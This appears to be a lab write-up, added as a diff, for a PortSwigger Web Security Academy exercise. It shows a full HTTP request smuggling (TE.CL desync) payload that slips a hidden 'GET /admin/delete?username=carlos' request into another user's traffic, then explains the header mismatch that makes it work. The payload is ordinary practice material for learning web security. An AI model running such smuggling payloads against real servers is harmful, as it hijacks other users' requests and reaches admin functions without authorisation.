@@ -1,0 +1,32 @@
+using the following I was able to smuggle the delete a user into the next request made by a user:
+
+"
+POST / HTTP/1.1
+Host: 0a94003d035e8d7480dc71db00d80010.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 24
+Cookie: session=pNjQAqAVtNbraQabDQAQYRMhqIuceBFl
+
+f
+yt10b=x&rehjd=x
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+"
+
+The front end used Transfer-Encoding, while the backend use content length.
+
+Knowing this I was then able to put my content length to 24, making the backend think 87 was the end of my request
+then this would put the delete request onto another user requesting the / page.
